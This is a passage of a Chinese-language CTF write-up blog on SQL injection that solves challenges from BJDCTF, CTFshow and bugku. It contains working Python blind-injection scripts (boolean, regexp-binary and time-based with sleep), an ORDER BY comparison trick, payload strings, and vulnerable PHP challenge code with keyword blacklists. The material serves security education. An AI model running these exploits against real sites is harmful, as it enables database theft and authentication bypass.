class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        d = <span class="string">"?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)='F1naI1y')),'"</span>+str(i)+<span class="string">"',1))='"</span>+str(j)+<span class="string">"')"</span></span><br><span class="line">        r = requests.get(url+d)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/DTSb4nMyjg6e89R.png" alt=""></p><p>emmmmmmm这里长度没给够，根据前面的经验，查password列应该就可以了，F1aaaaag表中没有东西</p><p>查字段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        d = <span class="string">"?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),'"</span>+str(i)+<span class="string">"',1))='"</span>+str(j)+<span class="string">"')"</span></span><br><span class="line">        r = requests.get(url+d)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>拿到flag：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/RvGOsyKqSXYNEug.png" alt=""></p><h3 id="BJDCTF-2nd—简单注入"><a href="#BJDCTF-2nd—简单注入" class="headerlink" title="BJDCTF-2nd—简单注入"></a>BJDCTF-2nd—简单注入</h3><p><strong>解题核心</strong>—————–regexp()正则匹配，binary大小写匹配，布尔盲注(亦可时间盲注)</p><p>参考：<a href="https://www.gem-love.com/ctf/2097.html#GirlfriendInjection" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2097.html#GirlfriendInjection</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/rODhM3lG8ux9Hdf.png" style="zoom:80%;" /><p>这题看着界面有点眼熟，这这个网站上有个类似的题<a href="http://pcat.cc/q.php" target="_blank" rel="noopener">http://pcat.cc/q.php</a> ，Question 5那一期的web题</p><p>先fuzz一下，以下字符被过滤：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/FnfpO9AMlex8UdC.png" style="zoom: 80%;" /><p>几个常用的注入参数被过滤：<code>&#39; &quot; select</code>，这几个参数被过滤就已经杀了大部分的可注入方式，于是想办法构造注入条件，题目解题思路和Question 5那一期的web题类似，直接给出解题方法</p><p>解题方法：在用户名处注入反斜杆<code>\</code>，可以将后端<code>sql</code>语句处<code>username</code>的后面的单引号转义</p><p>推测后端sql语句变成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username = <span class="string">'1\'</span> <span class="keyword">and</span> <span class="keyword">password</span> = <span class="string">' or 1#'</span></span><br></pre></td></tr></table></figure><p>测试后发题目下方的字符串改变了（可惜比赛的时候没注意），可以用regexp正则模糊匹配的方法构造sql注入语句注出<code>admin</code>的<code>password</code>，于是写<code>python</code>脚本盲注</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/Vc2DsFmxGRngN4p.png" style="zoom: 80%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://507fd7ed-7cc8-42d3-86ad-6b5ec032b815.node3.buuoj.cn/index.php"</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">&#125;</span><br><span class="line">str1 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span></span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line">pass1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        pass1 = <span class="string">'0x5E'</span> + passwd.replace(<span class="string">'0x5E'</span>,<span class="string">''</span>) + hex(ord(j)).replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">        payload = <span class="string">' or password regexp binary &#123;&#125;#'</span>.format(pass1)</span><br><span class="line">        <span class="comment">#print(pass1)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'1\\'</span>,</span><br><span class="line">            <span class="string">'password'</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data,headers=header)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'BJD needs'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            passwd = passwd + hex(ord(j)).replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">            print(j,end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注意这里<code>binary</code>的使用，比赛的时候就是被这里给坑了=.=，mysql默认不区分大小写，这里使用该关键字来区分大小写，还有<code>regexp</code>函数可以匹配十六进制数，涨姿势了，这样就可以绕过引号的过滤，另外上面的<code>Ezsqli</code>题也还有一种匹配大小写的方法，用于<code>in</code>被过滤，<code>binary</code>就不好使了</p><p>最后盲注出<code>password</code>为<code>OhyOuFOuNdit</code>登录<code>admin</code>账号即可得到<code>flag</code></p><p>另外还有一种时间盲注的方法： <code>or if(substr(password,1,1)regexp binary 0x5E...,sleep(3),1)</code></p><h3 id="CTFshow—web1"><a href="#CTFshow—web1" class="headerlink" title="CTFshow—web1"></a>CTFshow—web1</h3><p>访问<code>www.zip</code>得到源码</p><p>index.php（略）</p><p>login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$con = mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"web15"</span>);</span><br><span class="line">        <span class="keyword">if</span> (!$con)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">$username=$_POST[<span class="string">'username'</span>];</span><br><span class="line">$password=$_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($username) &amp;&amp; <span class="keyword">isset</span>($password))&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\'|\’|\“|\"|\&lt;|\&gt;|\?/i"</span>,$username))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql=<span class="string">"select pwd from user where uname = '$username' limit 1"</span>;</span><br><span class="line">$res=mysqli_query($con,$sql);</span><br><span class="line">$row = mysqli_fetch_array($res);</span><br><span class="line"><span class="keyword">if</span>($row[<span class="string">'pwd'</span>]===$password)&#123;</span><br><span class="line">$_SESSION[<span class="string">"login"</span>] = <span class="keyword">true</span>;</span><br><span class="line">header(<span class="string">"location:/user_main.php?order=id"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">header(<span class="string">"location:/index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">header(<span class="string">"location:/index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>reg.html（略）</p><p>reg.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$con = mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"web15"</span>);</span><br><span class="line">        <span class="keyword">if</span> (!$con)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">$username=$_POST[<span class="string">'username'</span>];</span><br><span class="line">$password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">$email=$_POST[<span class="string">'email'</span>];</span><br><span class="line">$nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\'|\’|\“|\"|\&lt;|\&gt;|\?/i"</span>,$username))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\'|\’|\“|\"|\&lt;|\&gt;|\?/i"</span>,$password))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\&#125;\]|\'|\’|\“|\"|\&lt;|\&gt;|\?/i"</span>,$email))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\&#125;|\]|\;|\'|\’|\“|\"|\&lt;|\&gt;|\?/i"</span>,$nickname))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($username) &amp;&amp; <span class="keyword">isset</span>($password) &amp;&amp; <span class="keyword">isset</span>($email) &amp;&amp; <span class="keyword">isset</span>($nickname))&#123;</span><br><span class="line">$sql = <span class="string">"INSERT INTO user (uname, pwd, email,nname) VALUES ('$username', '$password', '$email','$nickname')"</span>;</span><br><span class="line">            $res=mysqli_query($con, $sql);</span><br><span class="line">            <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">$_SESSION[<span class="string">"login"</span>] = <span class="keyword">true</span>;</span><br><span class="line">header(<span class="string">"location:/index.php"</span>);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>user_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;CTFshow_web&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">..........(css)</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"login"</span>]) &amp;&amp; $_SESSION[<span class="string">"login"</span>] === <span class="keyword">true</span>)&#123;</span><br><span class="line">$con = mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"web15"</span>);</span><br><span class="line">        <span class="keyword">if</span> (!$con)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">$order=$_GET[<span class="string">'order'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($order) &amp;&amp; strlen($order)&lt;<span class="number">6</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\'|\’|\“|\"|\&lt;|\&gt;|\?|\,|\.|\?/i"</span>,$order))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql=<span class="string">"select * from user order by $order"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $sql=<span class="string">"select * from user order by id"</span>;</span><br><span class="line">        &#125;   </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">..........(html)</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可以看到可传入的值都经过了严格的过滤，大多数特殊符号都被过滤，所以直接进行sql注入显然不可能，寻找其他的入手点，可以看到在<code>user_main.php</code>的传入的<code>order</code>值处，有一条<code>order by</code>语句，是用来根据<code>order by</code>后面的列来进行排序的，根据题目提示<code>flag_is_my_password</code>，所以我们只需要得到用户<code>flag</code>的密码即可，于是我们可以根据<code>pwd</code>的值来排序，然后配合盲注得出<code>flag</code>，我们注册不同密码的账号，原理假设密码为<code>e</code>（前端有个<code>md5</code>加密抓包可以直接绕过不影响），如果<code>flag</code>的密码为<code>flag{xxxxx}</code>那么<code>e</code>&lt;<code>flag{xxxxx}</code>，再传入<code>user_main.php?order=pwd</code>，那么密码为<code>e</code>的这一行就在flag这一行的上面。而如果注册一个密码为<code>g</code>的用户，则密码为<code>g</code>的用户的这一行则会在<code>flag</code>这一行的下面，于是就可以拿来进行盲注比较得出<code>flag</code>的所有值</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"https://b51823a7-b1c0-499d-878a-8a5b296655d3.chall.ctf.show"</span></span><br><span class="line">urlreg = url + <span class="string">"/reg.php"</span>  <span class="comment">#注册 必须要是可传参php文件</span></span><br><span class="line">urllogin = url + <span class="string">"/login.php"</span>  <span class="comment">#登录 必须要是可传参php文件</span></span><br><span class="line">urlorder = url + <span class="string">"/user_main.php?order=pwd"</span>  <span class="comment"># 显示</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">"-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~"</span>  <span class="comment"># 按照ascii码表的字符串大小排序</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        exp = <span class="string">""</span></span><br><span class="line">        exp = flag + j</span><br><span class="line">        datereg = &#123;</span><br><span class="line">            <span class="string">"username"</span>:exp,  <span class="comment"># 仔细观察username和password并没有对-和&#123;&#125;进行过滤</span></span><br><span class="line">            <span class="string">"email"</span>:<span class="string">"zzz"</span>,</span><br><span class="line">            <span class="string">"nickname"</span>:<span class="string">"zzz"</span>,</span><br><span class="line">            <span class="string">"password"</span>:exp</span><br><span class="line">        &#125;</span><br><span class="line">        datelogin = &#123;</span><br><span class="line">            <span class="string">"username"</span>:exp,</span><br><span class="line">            <span class="string">"password"</span>:exp</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (exp == <span class="string">'flag'</span>):  <span class="comment"># 当注册的用户名字为flag的时候，因为已经存在flag用户在，额直接打印flag跳过后面的语句的执行</span></span><br><span class="line">            flag = <span class="string">'flag'</span></span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        session = requests.session()  <span class="comment"># 保持会话</span></span><br><span class="line">        reg = session.post(urlreg, datereg)</span><br><span class="line">        login = session.post(urllogin, datelogin)</span><br><span class="line">        a = session.get(urlorder)</span><br><span class="line">        txt = a.text</span><br><span class="line">        <span class="keyword">if</span> (txt.index(<span class="string">"&lt;td&gt;"</span>+exp+<span class="string">"&lt;/td&gt;"</span>)&gt;txt.index(<span class="string">"&lt;td&gt;flag@ctf.show&lt;/td&gt;"</span>)):  <span class="comment"># index返回字符串被找到到最小的索引（最左）</span></span><br><span class="line">            flag = flag + chr(ord(j)<span class="number">-1</span>)   <span class="comment"># 得到的字符为比flag的单个字符的值大1，所以需要-1</span></span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最终得到到flag</p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="WEB-Login-Only-For-36D"><a href="#WEB-Login-Only-For-36D" class="headerlink" title="WEB_Login_Only_For_36D"></a>WEB_Login_Only_For_36D</h3><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210354938.png" alt=""></p><p><strong>F12</strong>可以看到<strong>hint</strong></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210443551.png" alt=""></p><p>可以看到这里需要username匹配admin，随后才可以输入密码，先在<strong>password</strong>处<strong>fuzz</strong>一下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210743129.png" alt=""></p><p>过滤了单引号，如果password中要用单引号闭合的话显然很难这里就需要从username入手，详情可以参考上面的<code>BJDCTF-2nd—简单注入</code>，和p神和Smi1e师傅的文章：</p><ul><li><a href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">[小密圈]经典写配置漏洞与几种变形学习</a></li><li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">经典写配置漏洞与几种变形</a></li></ul><p>这里直接给出payload：<code>username=admin%0a\&amp;password=/**/or/**/if(left((password),1)REGEXP/**/binary/**/&quot;I&quot;,sleep(3),1)#</code></p><p>exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">"https://bbafd3a8-7f89-4adf-84c2-7028b93775cc.chall.ctf.show/"</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">&#125;</span><br><span class="line">str1 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span></span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j in str1:</span><br><span class="line">        exp = passwd + j</span><br><span class="line">        payload = <span class="string">'/**/or/**/if(left((password),&#123;&#125;)REGEXP/**/binary/**/"^&#123;&#125;",sleep(3),1)#'</span>.format(i, exp)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'admin%0a\\'</span>,</span><br><span class="line">            <span class="string">'password'</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data,headers=header)</span><br><span class="line">        <span class="keyword">if</span> r.elapsed.total_seconds()&gt;<span class="number">1</span>:</span><br><span class="line">            passwd = passwd + j</span><br><span class="line">            <span class="keyword">print</span>(j,end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这里需要注意以下几点：</p><ul><li><code>binary</code>匹配大小写</li><li><code>mid</code>和<code>substr</code>被过滤了用<code>left</code></li><li>空格用<code>/**/</code></li></ul><p>随后就可以跑出密码登录即可得到<code>flag</code></p><h3 id="XCTF—INSERT-INTO注入"><a href="#XCTF—INSERT-INTO注入" class="headerlink" title="XCTF—INSERT INTO注入"></a>XCTF—INSERT INTO注入</h3><p><strong>解题核心</strong>—————–substr(),x-forwarded-for头注入</p><p>平台：[bugku INSERT INTO注入](<a href="https://ctf.bugku.com/challenges#INSERT" target="_blank" rel="noopener">https://ctf.bugku.com/challenges#INSERT</a> INTO注入)题目链接：<a href="http://123.206.87.240:8002/web15/" target="_blank" rel="noopener">http://123.206.87.240:8002/web15/</a></p><p>在题目的下方给了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flag格式：flag&#123;xxxxxxxxxxxx&#125;</span><br><span class="line">不如写个Python吧</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values 